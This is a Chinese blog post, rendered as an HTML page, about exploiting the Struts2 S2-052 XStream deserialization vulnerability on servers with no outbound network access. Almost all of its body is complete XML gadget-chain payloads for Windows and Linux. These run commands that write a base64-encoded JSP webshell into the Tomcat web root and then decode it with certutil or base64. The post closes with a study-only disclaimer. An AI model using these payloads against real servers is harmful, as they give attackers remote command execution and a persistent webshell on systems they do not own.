

<!DOCTYPE html>
<html lang="" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="不出网利用的小笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="s2-052">
<meta property="og:url" content="http://novysodope.github.io/2022/02/08/75/index.html">
<meta property="og:site_name" content="novy&#39;s Blog">
<meta property="og:description" content="不出网利用的小笔记">
<meta property="og:locale">
<meta property="og:image" content="http://novysodope.github.io/images/75/1.png">
<meta property="og:image" content="http://novysodope.github.io/images/75/2.png">
<meta property="og:image" content="http://novysodope.github.io/images/75/3.png">
<meta property="og:image" content="http://novysodope.github.io/images/75/4.png">
<meta property="article:published_time" content="2022-02-08T00:14:21.000Z">
<meta property="article:modified_time" content="2024-09-22T10:18:30.234Z">
<meta property="article:author" content="novy">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://novysodope.github.io/images/75/1.png">
  
  <title>s2-052 - novy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>novy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友情链接
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="s2-052">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      novy
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-08 08:14" pubdate>
        February 8, 2022 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      7.9k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      25 分钟
    </span>
  

  
  
    

      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">s2-052</h1>
            
            <div class="markdown-body">
              <p>网上的都是那种弹计算器或者反弹shell的例子，实际环境中很多不出网的机器，所小小研究了一下</p>
<p>首先要知道<code>&lt;command&gt;</code>里的每个<code>&lt;string&gt;</code>标签都表示一个参数字符，比如打开calc：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;<span class="hljs-built_in">command</span>&gt;<br>&lt;string&gt;calc&lt;/string&gt;<br>&lt;/<span class="hljs-built_in">command</span>&gt;<br></code></pre></div></td></tr></table></figure>
<p>加上cmd /c来转成shell命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"> &lt;<span class="hljs-built_in">command</span>&gt;<br> &lt;string&gt;cmd&lt;/string&gt;<br>&lt;string&gt;/c&lt;/string&gt;<br>&lt;string&gt;calc&lt;/string&gt;<br> &lt;/<span class="hljs-built_in">command</span>&gt;<br></code></pre></div></td></tr></table></figure>
<p>利用echo来写入一个webshell</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;<span class="hljs-built_in">command</span>&gt;<br>&lt;string&gt;cmd&lt;/string&gt;<br>&lt;string&gt;/c&lt;/string&gt;<br>&lt;string&gt;<span class="hljs-built_in">echo</span> 123 &gt;../webapps/ROOT/12.jsp&lt;/string&gt;<br>&lt;/<span class="hljs-built_in">command</span>&gt;<br></code></pre></div></td></tr></table></figure>
<p>webshell内容里会出现各种标签、换行和特殊符号等，所以要利用base64来发两次请求生成webshell<br>把内容转成base64输出到txt</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;<span class="hljs-built_in">command</span>&gt;<br>&lt;string&gt;cmd&lt;/string&gt;<br>&lt;string&gt;/c&lt;/string&gt;<br>&lt;string&gt;<span class="hljs-built_in">echo</span> PCU9bmV3IGphdmEudXRpbC5EYXRlKCklPg== &gt;../webapps/ROOT/12.txt&lt;/string&gt;<br> &lt;/<span class="hljs-built_in">command</span>&gt;<br></code></pre></div></td></tr></table></figure>
<p>发送第一次请求落地文件<br><img src="/images/75/1.png" srcset="/img/loading.gif" lazyload><br>第二次请求利用系统自带的base64解码来解码文件内容并转成webshell文件格式<br><img src="/images/75/2.png" srcset="/img/loading.gif" lazyload><br>然后就可以访问webshell了<br><img src="/images/75/3.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="windows环境"><a href="#windows环境" class="headerlink" title="windows环境"></a>windows环境</h2><p>第一次请求：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;map&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString&gt;<br>      &lt;flags&gt;0&lt;/flags&gt;<br>      &lt;value class=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;<br>        &lt;dataHandler&gt;<br>          &lt;dataSource class=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="hljs-variable">$XmlDataSource</span>&quot;</span>&gt;<br>            &lt;is class=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;<br>              &lt;cipher class=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;<br>                &lt;initialized&gt;<span class="hljs-literal">false</span>&lt;/initialized&gt;<br>                &lt;opmode&gt;0&lt;/opmode&gt;<br>                &lt;serviceIterator class=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;<br>                  &lt;iter class=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;<br>                    &lt;iter class=<span class="hljs-string">&quot;java.util.Collections<span class="hljs-variable">$EmptyIterator</span>&quot;</span>/&gt;<br>                    &lt;next class=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;<br>                      &lt;<span class="hljs-built_in">command</span>&gt;<br>                     &lt;string&gt;cmd&lt;/string&gt;<br>&lt;string&gt;/c&lt;/string&gt;<br>&lt;string&gt;<span class="hljs-built_in">echo</span> PCU9bmV3IGphdmEudXRpbC5EYXRlKCklPg== &gt;../webapps/ROOT/12.txt&lt;/string&gt;<br>                      &lt;/<span class="hljs-built_in">command</span>&gt;<br>                      &lt;redirectErrorStream&gt;<span class="hljs-literal">false</span>&lt;/redirectErrorStream&gt;<br>                    &lt;/next&gt;<br>                  &lt;/iter&gt;<br>                  &lt;filter class=<span class="hljs-string">&quot;javax.imageio.ImageIO<span class="hljs-variable">$ContainsFilter</span>&quot;</span>&gt;<br>                    &lt;method&gt;<br>                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;<br>                      &lt;name&gt;start&lt;/name&gt;<br>                      &lt;parameter-types/&gt;<br>                    &lt;/method&gt;<br>                    &lt;name&gt;foo&lt;/name&gt;<br>                  &lt;/filter&gt;<br>                  &lt;next class=<span class="hljs-string">&quot;string&quot;</span>&gt;foo&lt;/next&gt;<br>                &lt;/serviceIterator&gt;<br>                &lt;lock/&gt;<br>              &lt;/cipher&gt;<br>              &lt;input class=<span class="hljs-string">&quot;java.lang.ProcessBuilder<span class="hljs-variable">$NullInputStream</span>&quot;</span>/&gt;<br>              &lt;ibuffer&gt;&lt;/ibuffer&gt;<br>              &lt;<span class="hljs-keyword">done</span>&gt;<span class="hljs-literal">false</span>&lt;/<span class="hljs-keyword">done</span>&gt;<br>              &lt;ostart&gt;0&lt;/ostart&gt;<br>              &lt;ofinish&gt;0&lt;/ofinish&gt;<br>              &lt;closed&gt;<span class="hljs-literal">false</span>&lt;/closed&gt;<br>            &lt;/is&gt;<br>            &lt;consumed&gt;<span class="hljs-literal">false</span>&lt;/consumed&gt;<br>          &lt;/dataSource&gt;<br>          &lt;transferFlavors/&gt;<br>        &lt;/dataHandler&gt;<br>        &lt;dataLen&gt;0&lt;/dataLen&gt;<br>      &lt;/value&gt;<br>    &lt;/jdk.nashorn.internal.objects.NativeString&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>&lt;/map&gt;<br></code></pre></div></td></tr></table></figure>
<p>第二次请求</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;map&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString&gt;<br>      &lt;flags&gt;0&lt;/flags&gt;<br>      &lt;value class=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;<br>        &lt;dataHandler&gt;<br>          &lt;dataSource class=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="hljs-variable">$XmlDataSource</span>&quot;</span>&gt;<br>            &lt;is class=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;<br>              &lt;cipher class=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;<br>                &lt;initialized&gt;<span class="hljs-literal">false</span>&lt;/initialized&gt;<br>                &lt;opmode&gt;0&lt;/opmode&gt;<br>                &lt;serviceIterator class=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;<br>                  &lt;iter class=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;<br>                    &lt;iter class=<span class="hljs-string">&quot;java.util.Collections<span class="hljs-variable">$EmptyIterator</span>&quot;</span>/&gt;<br>                    &lt;next class=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;<br>                      &lt;<span class="hljs-built_in">command</span>&gt;<br>                     &lt;string&gt;cmd&lt;/string&gt;<br>&lt;string&gt;/c&lt;/string&gt;<br>&lt;string&gt;certutil -decode ../webapps/ROOT/12.txt ../webapps/ROOT/12.jsp&lt;/string&gt;<br>                      &lt;/<span class="hljs-built_in">command</span>&gt;<br>                      &lt;redirectErrorStream&gt;<span class="hljs-literal">false</span>&lt;/redirectErrorStream&gt;<br>                    &lt;/next&gt;<br>                  &lt;/iter&gt;<br>                  &lt;filter class=<span class="hljs-string">&quot;javax.imageio.ImageIO<span class="hljs-variable">$ContainsFilter</span>&quot;</span>&gt;<br>                    &lt;method&gt;<br>                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;<br>                      &lt;name&gt;start&lt;/name&gt;<br>                      &lt;parameter-types/&gt;<br>                    &lt;/method&gt;<br>                    &lt;name&gt;foo&lt;/name&gt;<br>                  &lt;/filter&gt;<br>                  &lt;next class=<span class="hljs-string">&quot;string&quot;</span>&gt;foo&lt;/next&gt;<br>                &lt;/serviceIterator&gt;<br>                &lt;lock/&gt;<br>              &lt;/cipher&gt;<br>              &lt;input class=<span class="hljs-string">&quot;java.lang.ProcessBuilder<span class="hljs-variable">$NullInputStream</span>&quot;</span>/&gt;<br>              &lt;ibuffer&gt;&lt;/ibuffer&gt;<br>              &lt;<span class="hljs-keyword">done</span>&gt;<span class="hljs-literal">false</span>&lt;/<span class="hljs-keyword">done</span>&gt;<br>              &lt;ostart&gt;0&lt;/ostart&gt;<br>              &lt;ofinish&gt;0&lt;/ofinish&gt;<br>              &lt;closed&gt;<span class="hljs-literal">false</span>&lt;/closed&gt;<br>            &lt;/is&gt;<br>            &lt;consumed&gt;<span class="hljs-literal">false</span>&lt;/consumed&gt;<br>          &lt;/dataSource&gt;<br>          &lt;transferFlavors/&gt;<br>        &lt;/dataHandler&gt;<br>        &lt;dataLen&gt;0&lt;/dataLen&gt;<br>      &lt;/value&gt;<br>    &lt;/jdk.nashorn.internal.objects.NativeString&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>&lt;/map&gt;<br></code></pre></div></td></tr></table></figure>
<p>不要问为什么不能在第一次请求中加个管道符一次性执行，我试了几次没成功，有空的再自己试试吧</p>
<h2 id="linux环境："><a href="#linux环境：" class="headerlink" title="linux环境："></a>linux环境：</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;map&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString&gt;<br>      &lt;flags&gt;0&lt;/flags&gt;<br>      &lt;value class=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;<br>        &lt;dataHandler&gt;<br>          &lt;dataSource class=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="hljs-variable">$XmlDataSource</span>&quot;</span>&gt;<br>            &lt;is class=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;<br>              &lt;cipher class=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;<br>                &lt;initialized&gt;<span class="hljs-literal">false</span>&lt;/initialized&gt;<br>                &lt;opmode&gt;0&lt;/opmode&gt;<br>                &lt;serviceIterator class=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;<br>                  &lt;iter class=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;<br>                    &lt;iter class=<span class="hljs-string">&quot;java.util.Collections<span class="hljs-variable">$EmptyIterator</span>&quot;</span>/&gt;<br>                    &lt;next class=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;<br>                      &lt;<span class="hljs-built_in">command</span>&gt;<br>                     &lt;string&gt;bash&lt;/string&gt;<br>&lt;string&gt;-c&lt;/string&gt;<br>&lt;string&gt;<span class="hljs-built_in">echo</span> PCU9bmV3IGphdmEudXRpbC5EYXRlKCklPg== | base64 -d &gt; ../webapps/ROOT/12.jsp&lt;/string&gt;<br>                      &lt;/<span class="hljs-built_in">command</span>&gt;<br>                      &lt;redirectErrorStream&gt;<span class="hljs-literal">false</span>&lt;/redirectErrorStream&gt;<br>                    &lt;/next&gt;<br>                  &lt;/iter&gt;<br>                  &lt;filter class=<span class="hljs-string">&quot;javax.imageio.ImageIO<span class="hljs-variable">$ContainsFilter</span>&quot;</span>&gt;<br>                    &lt;method&gt;<br>                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;<br>                      &lt;name&gt;start&lt;/name&gt;<br>                      &lt;parameter-types/&gt;<br>                    &lt;/method&gt;<br>                    &lt;name&gt;foo&lt;/name&gt;<br>                  &lt;/filter&gt;<br>                  &lt;next class=<span class="hljs-string">&quot;string&quot;</span>&gt;foo&lt;/next&gt;<br>                &lt;/serviceIterator&gt;<br>                &lt;lock/&gt;<br>              &lt;/cipher&gt;<br>              &lt;input class=<span class="hljs-string">&quot;java.lang.ProcessBuilder<span class="hljs-variable">$NullInputStream</span>&quot;</span>/&gt;<br>              &lt;ibuffer&gt;&lt;/ibuffer&gt;<br>              &lt;<span class="hljs-keyword">done</span>&gt;<span class="hljs-literal">false</span>&lt;/<span class="hljs-keyword">done</span>&gt;<br>              &lt;ostart&gt;0&lt;/ostart&gt;<br>              &lt;ofinish&gt;0&lt;/ofinish&gt;<br>              &lt;closed&gt;<span class="hljs-literal">false</span>&lt;/closed&gt;<br>            &lt;/is&gt;<br>            &lt;consumed&gt;<span class="hljs-literal">false</span>&lt;/consumed&gt;<br>          &lt;/dataSource&gt;<br>          &lt;transferFlavors/&gt;<br>        &lt;/dataHandler&gt;<br>        &lt;dataLen&gt;0&lt;/dataLen&gt;<br>      &lt;/value&gt;<br>    &lt;/jdk.nashorn.internal.objects.NativeString&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>  &lt;entry&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>&lt;/map&gt;<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/75/4.png" srcset="/img/loading.gif" lazyload></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/05/09/98/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">某报表微服务jdbc反序列化</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/10/73/">
                        <span class="hidden-mobile">纠正一个漏洞</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
